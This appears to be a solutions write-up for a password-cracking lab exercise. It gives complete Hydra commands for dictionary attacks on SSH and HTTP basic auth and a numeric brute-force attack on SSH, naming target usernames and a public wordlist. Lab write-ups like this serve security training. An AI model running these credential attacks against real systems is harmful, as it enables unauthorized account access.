# Solutions
There may be other valid ways of doing this but these are the methods that worked for me.

I used a tool called [Hydra](https://tools.kali.org/password-attacks/hydra)

## Dictionary Attacks
For the below dictionary attacks I used the 
[10-million-password-list-top-10000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt) dictionary.

### SSH
Because there are multiple ssh users that might be vulnerable to
dictionary attacks I made a `users.txt` file with the names in it like below:
```
dave
jeremy
```
I then ran the below command:
```
hydra \
    -L users.txt \
    -P 10-million-password-list-top-10000.txt \
    -o output.txt \
    -u -e nsr \
    <IP ADDRESS> ssh
```

### Basic Auth
To crack the basic auth password i ran the below command:
```
hydra \
    -l bob \
    -P 10-million-password-list-top-10000.txt \
    -o output.txt \
    -u -e nsr \
    -s 80 \
    <IP ADDRESS> http-get /
```

## Brute force
### SSH
To bruteforce the ssh password I ran the below:
```
hydra \
    -l keith \
    -x 4:4:1 \
    -o output.txt \
    <IP ADDRESS> ssh
```
